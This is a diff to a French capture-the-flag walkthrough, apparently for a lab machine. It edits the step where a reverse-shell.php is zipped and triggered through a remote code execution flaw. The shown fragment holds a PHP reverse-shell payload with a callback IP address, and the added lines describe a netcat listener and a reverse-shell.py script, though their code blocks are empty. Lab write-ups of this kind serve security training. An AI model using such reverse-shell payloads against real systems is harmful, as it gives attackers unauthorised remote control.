@@ -169,7 +169,6 @@ print(rce.text)
 ```
 
 Il ne reste plus qu'à créer le `reverse-shell.zip` avec le `reverse-shell.php` à l'intérieur pour être exécuté par le RCE:
-reverse-shell.php
 ```php
 <?php
 $ip = '10.10.14.174'; // change this to your IP address
@@ -191,4 +190,10 @@ if ($socket) {
 ?>
 ```
 
-Puis, on lance netcat pour
+Puis, on lance netcat pour écouter les connexions entrantes:
+```bash
+```
+
+On exécute finalement le script `reverse-shell.py`:
+```bash
+```
